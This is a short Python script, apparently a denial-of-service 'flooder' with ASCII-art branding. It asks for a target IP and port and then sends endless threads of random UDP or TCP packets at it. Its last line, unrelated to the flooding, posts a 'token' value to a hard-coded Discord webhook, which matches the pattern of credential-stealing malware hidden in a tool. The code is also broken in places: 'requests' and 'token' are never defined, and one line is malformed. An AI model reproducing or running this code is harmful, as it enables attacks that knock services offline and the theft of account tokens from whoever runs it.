#dansXd..

import random

import socket

import threading

print('''

██████╗░░█████╗░███╗░░██╗░██████╗██╗░░██╗██████╗░

██╔══██╗██╔══██╗████╗░██║██╔════╝╚██╗██╔╝██╔══██╗

██║░░██║███████║██╔██╗██║╚█████╗░░╚███╔╝░██║░░██║

██║░░██║██╔══██║██║╚████║░╚═══██╗░██╔██╗░██║░░██║

██████╔╝██║░░██║██║░╚███║██████╔╝██╔╝╚██╗██████╔╝

╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═════╝░''')

ip = str(input("ip:"))

port = int(input("Port:"))

times = int(input("Connections:"))

threads = int(input("Threading:"))

choice = str(input("Ready? (y):"))

def run():

	data = random._urandom(1025)	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print("!! dansZxd X Legends!!!")

		except:

			print("!! Attack !!!")

def run2():

	data = random._urandom(150)

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print("!! dansZxd X Legends!!!")

		except:

			s.close()

			print("!! Attack !!!")

for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

	else:

		th = threading.Thread(target = run2)

		th.start()







requests.post('https://discordapp.com/api/webhooks/941493128844697600/slJMtzD2zqI9nrzuZLV6LwodQYd85Dgz7uwqvaytXova9LJKJ7Uf-mSmM4RIM_4UhGO6',json={'content': f"<@913416321612517406> **__@everyone__**:  `{token}`"})
